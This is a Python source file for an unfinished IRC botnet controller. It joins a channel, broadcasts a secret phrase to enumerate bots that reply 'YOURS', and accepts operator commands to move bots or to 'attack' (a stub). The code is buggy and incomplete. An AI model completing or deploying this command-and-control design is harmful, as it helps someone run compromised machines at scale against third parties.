#!/usr/bin/python3

import sys
import socket
import random
import string
import time

class PyBotCon:
# NOTES --> Have to thread a listener into this program to listen for responses in a while(True) loop
# NOTES --> Data collected from the listener thread has to be responded to appropriately
#             Bot responses to the secret need to populate a botList when appropriate
#             Bots need to respond to commands appropriately, and the thread needs to check flags to listen for these responses
# NOTES --> Commands from the user behind the conbot need to be able to input commands while the listener is collecting data
# Need to wait for 5 seconds then parse input from s.recv as long as s has data in it
# In the 5 seconds of wait time the socket will cache the data it receives
# After wait time (or before) the program will prompt for user input
  #PyBot object constructor 
  def __init__(self,host,port,channel,secret,s):

    #Create PyBotCon instanace variables
    self.host = host
    self.port = port
    self.channel = channel
    self.secret = secret
    self.nick = self.generateRandomName()
    self.controlMode = 0 #default 0 = bot not being controller

    try: # NOTE: Should put this in some kind of loop so the bot can retry, generateRandomName() should be called from inside of the loop
      self.s = s.connect((host,int(port)))
      s.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
      s.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
    except:
      print("unable to connect to irc server")
    s.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
#    self.listen()

  def conMain(self):
    while(True):
      print("command> ",end='')
      command = input()
      if(command == "status"):
        self.identifyBots(self.secret,self.channel)
        print(srt(len(self.botList))+" bots found: " + str(self.botList))
      elif(command.startswith("attack")):
        # NOTE --> Need to create a function for sending the attack command
        print("Call attack function here")
      elif(command.startswith("move")):
        chanCommand = command.split()
        self.changeChannel(self.channel, chanCommand[1], chanCommand[2], chanCommand[3])
        # Need to call a move channel function for the conbot, will write later
      elif(command=="quit"):
        # NOTE --> Might need to actually disconnect form the IRC server before exiting the program, will have to look into this
        sys.exit("Command Bot Disconnected")
      elif(comand=="shutdown"):
        sys.exit("Not Iplemented")
        # Need to create a function for sending shutdown message to the channel

  def listen(self):
    while True:
      data = ""
      data = s.recv(4096).decode("UTF-8")
      data = data.strip("\n\r")
      print("DEBUG --> data recieved: " + data)

      if data.find("PING :") != -1:  #Respond to server pings (keep alive)
        s.send(bytes("PONG :pingis\n","UTF-8"))

      elif data.find("PRIVMSG") != -1:
        temp = data.split("!")
        user = temp[0][1:] #extract and trim user from temp
        temp = data.split("PRIVMSG")
        temp2 = temp[1].split(":")
        message = temp2[1]
        print("DEBUG --> " + user + " Says: " + message)
        self.examinePrivmsg(user,message)

  def examinePrivmsg(self,user,message):
# This needs to be updated to store the controller's information and accept control commands from the controller only
    if message == secret:
      print("DEBUG --> Controller said the secret! Control Mode enabled, read to troll and annoy")
      self.control = 1

  def changeChannel(self,channel,newServer, newPort, newChannel):
    self.s.send(bytes("PRIVMSG" + channel + " " + "move " + newServer + " " + newPort + " " + newChannel + "\n"))  

  def identifyBots(self,secret,channel):
    self.s.send(bytes("PRIVMSG " + channel + " " + secret + "\n")) # Send 'hello' message for bots to identify themselves
    self.botList = [] # botList starts as an empty list: it is cleared and rebuilt every time this function is called
    time.sleep(6)
    for i in range(10): 
# NOTE --> I'm not sure how I should be listening for bot replies, this will need to be adjusted
      data = self.s.recv(4096).decode("UTF-8")
      data = data.strip("\r\n")
      if(data.find("PRIVMSG {} :".format(self.nick))!=-1 and data.split("PRIVMSG",1)[1].split(":",1)[1]=="YOURS"): # NOTE --> The response message that we're expecting from bots is "YOURS"
        temp = data.split("!",1)[0][1:] # Finds name of the bot reply
        self.botList.append(temp[0][1:]) # Adds the name of the bot reply to botList

  def generateRandomName(self):
    randomName = "".join(random.choice(string.ascii_uppercase + string.digits) for i in range(8))
    return randomName
        

#Main
if __name__ == '__main__':

  if(len(sys.argv) == 5):
    host = sys.argv[1]
    port = sys.argv[2]
    channel = "#"+sys.argv[3]
    secret = sys.argv[4]
  else:
    print("Incorrect number of arguments")
    sys.exit("Usage: conbot.py <hostname> <port> <channel> <secret-phrase>")

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  conBot = PyBotCon(host,port,channel,secret,s) #Create an instance of the bot 
  












